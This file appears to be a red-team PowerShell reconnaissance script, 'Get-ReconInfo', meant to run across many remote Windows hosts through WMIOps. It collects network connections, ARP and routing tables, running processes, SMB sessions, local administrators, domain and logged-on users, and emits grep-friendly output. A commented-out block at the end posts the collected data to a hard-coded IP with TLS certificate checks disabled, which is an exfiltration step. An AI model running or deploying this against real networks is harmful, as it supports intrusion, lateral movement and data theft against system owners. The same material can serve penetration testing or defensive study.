#requires -version 2

<#
    Get-ReconInfo File: Get-ReconInfo.ps1
    Author: Chris King (@raikiasec)
#>

function Get-ReconInfo {
<#
    .SYNOPSIS

      Lists connections and relevant info about a system


      Author: Chris King (@raikiasec)

    .DESCRIPTION

      This script runs the following commands on the local system, parses the output, and prints the results to the screen:
            * netstat -ano
            * ipconfig /all
            * arp -a
            * tasklist /v
            * route print
            * net session
            * net localgroup "Administrators"
            * (Get-WmiObject Win32_ComputerSystem).Name
            * (Get-WmiObject Win32_ComputerSystem).Domain
       
      This is especially useful when run at-scale in a network where you may need to identify routes and connections into a specific IP zone. You can
      execute this script on the remote systems and get greppable output to see if they have connections to your targets.

      This script pairs well with Invoke-RemoteScriptWithOutput from WMIOPS (https://github.com/ChrisTruncer/WMIOps).  Using WMIOps and this script,
      you can get connection information from a large number of systems very quickly, with easily digestable output.

      By default, the script returns the full raw output.  If you only want the greppable output, set $PRINT_FULL to false.  Its not a parameter because WMIOPS
      does not accept parameters for Invoke-RemoteScriptWithOutput.  Its recommended you redirect the output to a file, and then you can grep through the output
      easily.


    .INPUTS

      None


    .OUTPUTS

      Prints greppable information to the screen.  If $PRINT_FULL boolean is set (default True), it also prints the raw command results for more detailed informaton later

    .NOTES
  
      Edit the $PRINT_FULL boolean if you want to print the full raw results.  When you run this script, its best to redirect the output to a file.  You can then grep that file
      with the search term "GREP" to get the relevant data.
  
    .EXAMPLE
  
      Get-ReconInfo > C:\temp\connection_info.txt

#>
    
    ############### VARIABLE #################
    ##                                      ##
    ## SET THIS TO $False IF YOU DON'T WANT ## 
    ## THE RAW DATA TO BE OUTPUTTED AS WELL ##
    ## AS GREPPABLE OUTPUT                  ##
    ##                                      ##
    $PRINT_FULL = $True                     ##
    ##                                      ##
    ##########################################

    $compname = $env:computername
    if ($PRINT_FULL) {
        Write-Output "---- Starting $compname ----"
    }

    ## Netstat
    $netstat_out = netstat -ano
    $ignore_full = @('*:*', 'Address')
    $ignore_ip = @('[', '127.0.0.1', '0.0.0.0', '')
    $found_ips = @()
    $netstat_out | ForEach-Object {
        $ip_port = ($_ -split '\s+' -match '\S')[2]
        $ip = ""
        if ($ip_port -like "*:*") {
            $ip = $ip_port.Split(':')[0]
        }
        if ($found_ips -notcontains $ip_port -and $ignore_full -notcontains $ip_port -and $ignore_ip -notcontains $ip -and -not [string]::IsNullOrWhiteSpace($ip_port)) {          
            $found_ips += $ip_port
        }
    }
    foreach ($ip in $found_ips) {
        Write-Output "GREP:${compname}:${ip}:netstat"
    }
    if ($PRINT_FULL){
        $netstat_out
    }


    ## IPConfig
    $ipconfig_out = ipconfig /all | findstr /V Subnet
    $ips = ([regex]'\d+\.\d+\.\d+\.\d+').Matches($ipconfig_out)
    $found_ips = @()
    foreach ($i in $ips) {
        if ($found_ips -notcontains $i) {
            $found_ips += $i
        }
    }
    foreach ($ip in $found_ips) {
        Write-Output "GREP:${compname}:${ip}:ipconfig"
    }
    if ($PRINT_FULL) {
        $ipconfig_out
    }


    ## ARP

    $arp_out = arp -a | findstr 'dynamic'
    $ips = ([regex]'\d+\.\d+\.\d+\.\d+').Matches($arp_out)
    $found_ips = @()
    foreach ($i in $ips) {
        if ($found_ips -notcontains $i) {
            $found_ips += $i
        }
    }
    foreach ($ip in $found_ips) {
        Write-Output "GREP:${compname}:${ip}:arp"
    }

    ## Tasklist 
    $tasklist = tasklist /v | findstr /V "===" | findstr /V "User Name"
    $found_tasks = @()
    $tasklist | ForEach-Object {
        $parts = $_ -split '\s{3,}'
        $together = $parts[0] + ":" + $parts[4]
        if ($found_tasks -notcontains $together) {
            $found_tasks += $together
        }
    }
    foreach ($task in $found_tasks) {
        Write-Output "GREP:${compname}:${task}:tasklist"
    }
    if ($PRINT_FULL) {
        $tasklist
    }


    ## Route
    $routes_out = route print

    if ($PRINT_FULL) {
        $routes_out
    }

    ## Net session
    $netsession_out = net session | findstr /V "Computer" | findstr /V "\-\-\-\-" | findstr /V "command completed" | findstr /V "no entries"
    $ips = ([regex]'\d+\.\d+\.\d+\.\d+').Matches($netsession_out)
    $found_ips = @()
    foreach ($i in $ips) {
        if ($found_ips -notcontains $i) {
            $found_ips += $i
        }
    }
    foreach ($ip in $found_ips) {
        Write-Output "GREP:${compname}:${ip}:net_session"
    }
    if ($PRINT_FULL) {
        $netsession_out
    }
    ## Local admins

    $netadmins_out = net localgroup "Administrators" | where {$_ -and $_ -notmatch "command completed successfully"} | select -skip 4

    $found_admins = @()
    $netadmins_out | foreach-object {
        if ($found_admins -notcontains $_) {
            $found_admins += $_
        }
    }
    foreach ($a in $found_admins) {
        Write-Output "GREP:${compname}:${a}:localadmins"
    }

    if ($PRINT_FULL) {
        $netadmins_out
    }

    ## Get system name
    $name = (Get-WmiObject Win32_ComputerSystem).Name
    Write-Output "GREP:${compname}:${name}:systemname"

    ## Get domain
    $name = (Get-WmiObject Win32_ComputerSystem).Domain
    Write-Output "GREP:${compname}:${name}:domain"
	
	## Get current logged on user
    $name = Get-WMIObject Win32_Process | ForEach { $owner = $_.GetOwner(); '{0}\{1}' -f $owner.Domain, $owner.User } | Sort-Object | Get-Unique
    Write-Output "GREP:${compname}:${name}:username"
	
}


#$output = Get-ReconInfo
#$finaloutput = Out-String -InputObject $output;
#$postback = 'http://10.37.165.103:10000/testpost.php';
#$uri = New-Object -TypeName System.Uri -ArgumentList $postback;
#[Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };
#$wcc = New-Object -TypeName System.Net.WebClient;
#$wcc.UploadString($uri, $finaloutput)